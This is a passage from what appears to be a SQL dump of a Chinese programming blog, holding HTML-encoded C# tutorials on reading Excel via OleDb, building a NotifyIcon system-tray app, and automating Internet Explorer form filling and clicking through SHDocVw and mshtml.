[Sheet1$]&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExcelSelectCmd.CommandText = ExcelSelectStr;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExcelDR = ExcelSelectCmd.ExecuteReader();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while (ExcelDR.Read())</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;{0}&quot;, ExcelDR.GetInt32(0));</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExcelOldDbConn.Close();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>}</p>\r\n\r\n<p>对应的excel的内容</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731142612972534.jpg\" style=\"height:240px; width:705px\" /></p>\r\n',0,1438323987,0,0),(138,38,'NotifyIcon实现托盘程序','<p>NotifyIcon 控件的常用属性</p>\r\n\r\n<p>属性：Icon<br />\r\n类型：System.Drawing.Icon<br />\r\n说明：将在系统任务栏中显示的图标。可以在设计时指定，也可在运行时动态指定。</p>\r\n\r\n<p>属性：Text<br />\r\n类型：String<br />\r\n说明：用于指定当鼠标停留在小图标上时显示的信息。</p>\r\n\r\n<p>属性：Visible<br />\r\n类型：Bool<br />\r\n说明：用于设置小图标是否显示。<br />\r\n注意：如果程序退出前没有将其设置为false，那么小图标将一直停留在系统栏，直到鼠标从上面经过时才会消失。</p>\r\n\r\n<p>操作：Click<br />\r\n说明：当鼠标单击时激发的事件</p>\r\n\r\n<p>操作：DoubleClick<br />\r\n说明：当鼠标双击时激发的事件</p>\r\n\r\n<p>操作：MouseDown<br />\r\n说明：当鼠标其中一键按下时激发的事件</p>\r\n\r\n<p>操作：MouseUp<br />\r\n说明：当鼠标其中一键松开时激发的事件</p>\r\n\r\n<p>操作：MouseMove<br />\r\n说明：当鼠标其中一键从上掠过时激发的事件<br />\r\n&nbsp;<br />\r\nBalloonTipIcon －－ 气球工具提示关联的图标<br />\r\nBallonnTipText －－ 气球工具提示关联的文本<br />\r\nBallonnTipText －－ 气球工具提示的标题<br />\r\n实践： &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; 要求将程序最小化的同时让程序的图标出现在&ldquo;系统托盘&rdquo;的位置上，而不显示在&ldquo;任务栏&rdquo;中。鼠标双击系统托盘中的图标时，还原窗体。</p>\r\n\r\n<p>&lt;1&gt;.ShowInTaskbar属性控制是否在任务栏显示窗体。<br />\r\n&lt;2&gt;.WindowState&nbsp; 属性指出当前Winform窗体的窗口状态。<br />\r\n当前窗口状态只有三种情况：<br />\r\n&nbsp;FormWindowState.Maximized;//最大化窗口<br />\r\n&nbsp;FormWindowState.Minimized;//最小化窗口<br />\r\n&nbsp;FormWindowState.Normal;//默认的窗口大小<br />\r\n&lt;3&gt;.使用notifyIcon控件是控制出现在系统托盘的内容的。<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; notifyIcon.Icon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; －－ 指定出现在任务栏中的Icon图标<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; notifyIcon.Text&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; －－ 显示的文本<br />\r\nnotifyIcon.BalloonTipIcon －－ 气球工具提示关联的图标<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; notigyIcon.BallonnTipText －－ 气球工具提示关联的文本<br />\r\nnotigyIcon.BallonnTipText －－ 气球工具提示的标题。</p>\r\n\r\n<p>&nbsp;&lt;4&gt;.应在Form_SizeChange事件中完成判断，具体代码：<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 最小化值系统托盘<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name=&quot;sender&quot;&gt;&lt;/param&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name=&quot;e&quot;&gt;&lt;/param&gt;<br />\r\nprivate void Form_SizeChanged(object sender, EventArgs e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (this.WindowState == FormWindowState.Minimized)&nbsp; //判断是否最小化<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ShowInTaskbar = false;&nbsp; //不显示在系统任务栏<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; notifyIcon.Visible = true;&nbsp; //托盘图标可见<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 还原（notifyIcon的鼠标双击事件）<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name=&quot;sender&quot;&gt;&lt;/param&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name=&quot;e&quot;&gt;&lt;/param&gt;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (this.WindowState == FormWindowState.Minimized)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ShowInTaskbar = true;&nbsp; //显示在系统任务栏<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.WindowState = FormWindowState.Normal;&nbsp; //还原窗体<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; notifyIcon1.Visible = false;&nbsp; //托盘图标隐藏<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;5&gt;.给notifyIcon添加右键菜单：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 主窗体中拖入一个ContextMenu控件contextMenu1，点中控件，在上下文菜单中添加菜单，notifyIcon1的ContextMenu行为中选中contextMenu1作为上下文菜单。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NotifyIcon.ShowBalloonTip (time) 在任务栏中持续显示气球提示指定的时间（以毫秒为单位）。最小和最大超时值由操作系统执行，一般分别为 10 秒和 30 秒，但这可能因操作系统而异。太大或太小的超时值将调整为适当的最小值或最大值。此外，如果用户看起来没有使用计算机（没有键盘或鼠标事件发生），则系统不将此时间计算在超时值内。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 一次只能在任务栏中显示一个气球提示。如果当前在任务栏中已经显示了一个气球提示，则尝试显示其他气球提示将导致忽略 timeout 值。行为会因气球提示是来自其他应用程序，还是来自同一应用程序而稍有不同。如果第二个气球提示来自其他应用程序，第一个气球提示将在第二个提示出现之前持续显示最小超时值，而不管 timeout. 的值是多少。如果这两个气球提示来自同一应用程序，则第一个气球提示在再次调用 ShowBalloonTip 方法时立即关闭。标题文本将在气球顶部附近以粗体显示。</p>\r\n\r\n<p>private void SetBalloonTip()<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; notifyIcon1.Icon = SystemIcons.Exclamation;<br />\r\n&nbsp;&nbsp;&nbsp; notifyIcon1.BalloonTipTitle = &quot;Balloon Tip Title&quot;;<br />\r\n&nbsp;&nbsp;&nbsp; notifyIcon1.BalloonTipText = &quot;Balloon Tip Text.&quot;;<br />\r\n&nbsp;&nbsp;&nbsp; notifyIcon1.BalloonTipIcon = ToolTipIcon.Error;<br />\r\n&nbsp;&nbsp;&nbsp; this.Click += new EventHandler(Form1_Click);<br />\r\n}</p>\r\n\r\n<p>void Form1_Click(object sender, EventArgs e)<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; notifyIcon1.Visible = true;</p>\r\n',0,1438327918,0,0),(139,38,'c#控制IE浏览器','<p>想写一个桌面程序，用C#。<br />\r\n程序运行后，会用IE打开指定的网页，并自动登录网站，再根据需要进行一些操作。<br />\r\n关键是不知道怎么控制IE浏览器，请大家指点一下。</p>\r\n\r\n<p>相关内容如下：</p>\r\n\r\n<p>C#控制IE浏览器<br />\r\n引入 C:\\WINDOWS\\System32\\mshtml.tlb、Interop.SHDocVw.dll</p>\r\n\r\n<p><br />\r\n/// &lt;summary&gt;<br />\r\n/// 返回指定Url的IE窗口下的 IHTMLDocument2 对象。<br />\r\n/// &lt;/summary&gt;<br />\r\n/// &lt;returns&gt;IHTMLDocument2&lt;/returns&gt;<br />\r\npublic static IHTMLDocument2 GetIHTMLDocument2ByUrl(string url)<br />\r\n{<br />\r\nSHDocVw.ShellWindows shellWindows = new SHDocVw.ShellWindowsClass();<br />\r\nforeach (SHDocVw.InternetExplorer ie in shellWindows)<br />\r\n{<br />\r\nstring filename = System.IO.Path.GetFileNameWithoutExtension(ie.FullName).ToLower();<br />\r\nif (filename.Equals(&ldquo;iexplore&ldquo;) &amp;&amp; ie.LocationURL == url)<br />\r\n{<br />\r\nreturn ie.Document as IHTMLDocument2;<br />\r\n}<br />\r\n}<br />\r\n}</p>\r\n\r\n<p>通过 GetIHTMLDocument2ByUrl 方法可以获取已打开的IE窗口中指写地址的窗口中的 IHTMLDocument2 对象。<br />\r\n利用这个对象，就可以进行相关操作。<br />\r\n1.填写表单<br />\r\nIHTMLDocument2 iHTMLDocument2 = GetIHTMLDocument2ByUrl(&ldquo;http://www.163.com&ldquo;);<br />\r\nIHTMLInputElement input = (IHTMLInputElement)iHTMLDocument2.all.item(&ldquo;Username&ldquo;, 0); // 获取指定名称的对象<br />\r\ninput.value = &ldquo;Xiao&ldquo;; // 赋值</p>\r\n\r\n<p><br />\r\n2.点击按钮<br />\r\nIHTMLDocument2 iHTMLDocument2 = GetIHTMLDocument2ByUrl(&ldquo;http://www.163.com&ldquo;);<br />\r\nHTMLDocumentClass obj = (HTMLDocumentClass)iHTMLDocument2;<br />\r\nIHTMLElement iHTMLElement = null;<br />\r\nIHTMLElementCollection c = obj.getElementsByTagName(&ldquo;input&ldquo;);<br />\r\nforeach (IHTMLElement e in c)<br />\r\n{<br />\r\nif (e.outerHTML.IndexOf(&ldquo;登录&ldquo;) != -1)<br />\r\n{<br />\r\niHTMLElement = e;<br />\r\nbreak;<br />\r\n}<br />\r\n}<br />\r\nif (iHTMLElement != null)<br />\r\n{<br />\r\niHTMLElement.click(); // 点击登录按钮<br />\r\n}</p>\r\n\r\n<p>更多功能可以参考 IHTMLDocument2 对象。</p>\r\n',0,1438327997,0,0),(140,38,'c#控制IE浏览器自动点击等事件WebBrowser，mshtml.IHTMLDocument2(转)','<p>可以实现例如通过应用程序操作google搜索，用户输入要搜索的内容，然后在google中搜索；可以自动点击网页上的按钮等功能</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 1. 加入对Microsoft Internet Controls的引用；<br />\r\n&nbsp;&nbsp;&nbsp; 2. 加入对Microsoft HTML Object Library的引用；</p>\r\n\r\n<p>（要引入Microsoft.mshtml.dll 地址是C:\\Program Files\\Microsoft.NET\\Primary Interop Assemblies）<br />\r\n&nbsp;&nbsp;&nbsp; 3. 通过mshtml.IHTMLDocument2、SHDocVw.InternetExplorer、SHDocVw.ShellWindowsClass获取当前打开的google搜索页面的IE窗口句柄；<br />\r\n&nbsp;&nbsp;&nbsp; 4. 根据3返回的句柄，获得当前打开的google页面的mshtml.IHTMLDocument2对象；<br />\r\n&nbsp;&nbsp;&nbsp; 5. 根据4返回的IHTMLDocument2对象，获得搜索输入框和提交按钮（可查看google页面源文件，确认输入框和提交按钮的类型和名字）；<br />\r\n&nbsp;&nbsp;&nbsp; 6. 在搜索输入框中输入要搜索的内容，并执行提交按钮的click动作即可进行搜索；</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>简单来说：</p>\r\n\r\n<p>打开ie：</p>\r\n\r\n<p>SHDocVw.ShellWindows shellWindows = new SHDocVw.ShellWindowsClass();<br />\r\nobject objFlags = 1;<br />\r\nobject objTargetFrameName = &quot;&quot;;<br />\r\nobject objPostData = &quot;&quot;;<br />\r\nobject objHeaders = &quot;&quot;;<br />\r\nSHDocVw.InternetExplorer webBrowser1= (SHDocVw.InternetExplorer)shellWindows.Item(shellWindows.Count-1);<br />\r\nwebBrowser1.Navigate(&ldquo;http://www.google.cn&rdquo;, ref objFlags, ref objTargetFrameName, ref objPostData, ref objHeaders);</p>\r\n\r\n<p>(可以简略点写：object c=null;myWeb.Navigate(&quot;http://zhidao.baidu.com/&quot;,ref c,ref c,ref c,ref c);)<br />\r\nmshtml.IHTMLDocument2 htmlDoc = webBrowser1.Document as mshtml.IHTMLDocument2;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//...获取WebBroswer中的body代码<br />\r\nmshtml.HTMLDocumentClass doc=(mshtml.HTMLDocumentClass)myWeb.Document;<br />\r\nmshtml.HTMLBody body=(mshtml.HTMLBody)docCC.body;<br />\r\nstring html=body.innerHTML.ToString();</p>\r\n\r\n<p>//...如果里面有Form，要给里面的text填充信息<br />\r\nmshtml.IHTMLDocument2 doc2=(mshtml.IHTMLDocument2)myWeb.Document;<br />\r\nmshtml.IHTMLElementCollection inputs;<br />\r\ninputs=(mshtml.IHTMLElementCollection)doc2.all.tags(&quot;INPUT&quot;);<br />\r\nmshtml.IHTMLElement element=(mshtml.IHTMLElement)inputs.item(&quot;userName&quot;,0);<br />\r\nmshtml.IHTMLInputElement inputElement=(mshtml.IHTMLInputElement)element;<br />\r\ninputElement.value=&quot;填充信息&quot;;</p>\r\n\r\n<p>//...要点击里面的某个按钮<br />\r\nmshtml.IHTMLDocument2 doc2=(mshtml.IHTMLDocument2)myWeb.Document;<br />\r\nmshtml.IHTMLElementCollection inputs;<br />\r\ninputs=(mshtml.IHTMLElementCollection)doc2.all.tags(&quot;INPUT&quot;);<br />\r\nmshtml.IHTMLElement element=(mshtml.IHTMLElement)inputs.item(&quot;SubmitBut&quot;,0);<br />\r\nelement.click();</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>1、根据元素ID获取元素的值。</p>\r\n\r\n<p>比如要获取&lt;img class=&quot;&quot; id=&quot;regimg&quot; src=&quot;/register/checkregcode.html?1287068791&quot; width=&quot;80&quot; height=&quot;22&quot;&gt;这个标签里的src属性的值：</p>\r\n\r\n<p>mshtml.IHTMLDocument2 doc2 = (mshtml.IHTMLDocument2)webBrowser1.Document;<br />\r\nmshtml.IHTMLElement img = (mshtml.IHTMLElement)doc2.all.item(&quot;regimg&quot;, 0);</p>\r\n\r\n<p>string imgUrl = (string)img.getAttribute(&quot;src&quot;);</p>\r\n\r\n<p>2、填写表单，并确定</p>\r\n\r\n<p>mshtml.IHTMLElement loginname = (mshtml.IHTMLElement)doc2.all.item(&quot;loginname&quot;, 0);<br />\r\n&nbsp;&nbsp;&nbsp; mshtml.IHTMLElement loginPW = (mshtml.IHTMLElement)doc2.all.item(&quot;password&quot;, 0);<br />\r\n&nbsp;&nbsp;&nbsp; mshtml.IHTMLElement loginBT = (mshtml.IHTMLElement)doc2.all.item(&quot;formsubmit&quot;, 0);<br />\r\n&nbsp;&nbsp;&nbsp; mshtml.IHTMLElement loginYZ = (mshtml.IHTMLElement)doc2.all.item(&quot;regcode&quot;, 0);<br />\r\n&nbsp;&nbsp;&nbsp; loginname.setAttribute(&quot;value&quot;, tbLoginName.Text);<br />\r\n&nbsp;&nbsp;&nbsp; loginPW.setAttribute(&quot;value&quot;, tbLoginPassWord.Password);<br />\r\n&nbsp;&nbsp;&nbsp; loginYZ.setAttribute(&quot;value&quot;, tbYZ.Text);<br />\r\n&nbsp;&nbsp;&nbsp; loginBT.click();</p>\r\n\r\n<p>3、获取源码</p>\r\n\r\n<p>textBox1.Text = doc2.body.innerHTML;</p>\r\n\r\n<p>4、执行JS</p>\r\n\r\n<p>mshtml.IHTMLWindow2 win = (mshtml.IHTMLWindow2)doc2.parentWindow;<br />\r\nwin.execScript(&quot;changeRegImg()&quot;, &quot;javascript&quot;);//使用JS</p>\r\n\r\n<p>5、禁止JS，WPF下目前发现唯一适用的一种方法：</p>\r\n\r\n<p>public void HideScriptErrors(WebBrowser wb, bool Hide)<br />\r\n&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; FieldInfo fiComWebBrowser = typeof(WebBrowser).GetField(&quot;_axIWebBrowser2&quot;, BindingFlags.Instance | BindingFlags.NonPublic);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (fiComWebBrowser == null) return;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; object objComWebBrowser = fiComWebBrowser.GetValue(wb);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; if (objComWebBrowser == null) return;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; objComWebBrowser.GetType().InvokeMember(</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &quot;Silent&quot;, BindingFlags.SetProperty, null, objComWebBrowser, new object[] { Hide });</p>\r\n\r\n<p>&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp; void webBrowser1_Navigated(object sender, NavigationEventArgs e)<br />\r\n&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; HideScriptErrors(webBrowser1,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; true);</p>\r\n\r\n<p>&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>下面是另外一遍博客里写的比较好的</p>\r\n\r\n<p>#region Search&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static void Search(string searchText)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SHDocVw.InternetExplorer ieWnd = GetIEWndOfGoogle();&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mshtml.IHTMLDocument2 ieDoc = GetIEDocOfGoogle(ref ieWnd);&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.Diagnostics.Trace.Assert(ieDoc != null);&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SearchTextInGoogle(ieDoc, searchText);&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //activate ie window&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SetForegroundWindow(ieWnd.HWND);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #endregion&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #region get ie window of google page&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static SHDocVw.InternetExplorer GetIEWndOfGoogle()&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mshtml.IHTMLDocument2 ieDoc;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SHDocVw.InternetExplorer ieWnd = null;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SHDocVw.ShellWindowsClass shellWindows = new SHDocVw.ShellWindowsClass();&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; foreach (SHDocVw.InternetExplorer ie in shellWindows)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //if it is ie window&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ie.FullName.ToUpper().IndexOf(&quot;IEXPLORE.EXE&quot;) &gt; 0)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //get the document displayed&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ieDoc = (mshtml.IHTMLDocument2)ie.Document;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (ieDoc.title.ToUpper().IndexOf(&quot;GOOGLE&quot;) &gt;= 0)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ieWnd = ie;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; shellWindows = null;&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return ieWnd;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #endregion&nbsp; &nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #region get ie document of google page&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static mshtml.IHTMLDocument2 GetIEDocOfGoogle(ref SHDocVw.InternetExplorer ieWnd)&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; object missing = null;&nbsp; &nbsp;<br 